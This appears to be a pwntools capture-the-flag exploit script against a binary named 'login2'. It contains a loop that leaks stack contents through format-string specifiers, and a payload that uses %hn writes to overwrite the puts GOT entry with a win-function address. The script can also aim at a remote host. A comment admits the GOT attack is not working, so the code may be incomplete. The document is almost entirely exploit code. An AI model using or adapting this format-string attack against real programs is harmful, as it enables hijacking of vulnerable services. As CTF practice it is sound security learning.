from pwn import *


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([exe] + argv, *a, **kwargs)


# GDB script
# gdb_script = """
# b *0x08049285
# b *0x08049320
# b *0x08049360
# b *0x08049335
# b *0x0804933a
# continue
# """
gdb_script = """
b *0x0804935f
b *0x08049365
continue
"""

# Prepare program
exe = "./login2"
context.binary = binary = ELF(exe, checksec=True)
context.log_level = "info"


# Buffer size is 39, only 13 of these printed!
def dump_stack():
    found_flag = ""
    for i in range(0, 100):
        try:
            io = start()
            res = io.recvlines(1)
            # info(res)
            # &favourite_number = 0x0804a044
            io.sendline(f" %{i}$p, %{i}$s".encode("latin-1"))
            # res = io.recvuntil(b"\n")
            res = io.recvall()
            if str(res).find("flag") != -1:
                found_flag = str(res)
            print(f"{i} : {str(res)}")
            # print(f"{i} : {str(res).encode("latin-1")}")

            print(50 * "-" + "\n")
        # info(res)
        except Exception as err:
            print(err)

    print("Flag: " + found_flag)


# dump_stack()
# 0x0804a000
# 0xffc45438
# 0x080487e0


def exploit(bin: ELF):
    # GOT attack not working :(
    # 0x8049080
    puts_plt = bin.plt.puts
    puts_got = bin.got.puts
    # 0xffffcc7c
    # password_addr = 0xFFFFCC6C
    #
    print(hex(puts_got))
    cmp_addr = 0x0804933D
    ret_addr = 0x080493A2
    target_addr = 0x08049285
    buff_addr = 0x0804A044
    jmp_addr = 0x0804933D
    win_addr = 0x080491D6
    # puts_got = 0x0804c014

    puts_got_low = puts_got
    puts_got_hi = puts_got + 2

    # loc = 0x0804A044 - 0x8048719
    io = start()
    res = io.recvlines(1)
    print(res)
    # lowbytes = 0x91D6 = 37334
    # highbyte = 0x0804 = 2052
    # val = 0x91D6 - 0x0804 = 35282

    # info(res)
    payload = p32(puts_got_hi, "little")
    payload += p32(puts_got_low, "little")
    # 8 bytes written so far
    payload += b"%2044x%11$hn"
    payload += b"%35282x%12$hn"

    print("Payload: ")
    print(payload)

    io.sendline(payload)
    # res = io.recvuntil(b"\n")
    # io.interactive()
    res = io.recvall()
    info(res)
    print(res)
    if str(res).find("flag") != -1:
        found_flag = str(res)
    # print(f"{i} : {str(res).encode("latin-1")}")

    print(50 * "-" + "\n")


exploit(binary)
#
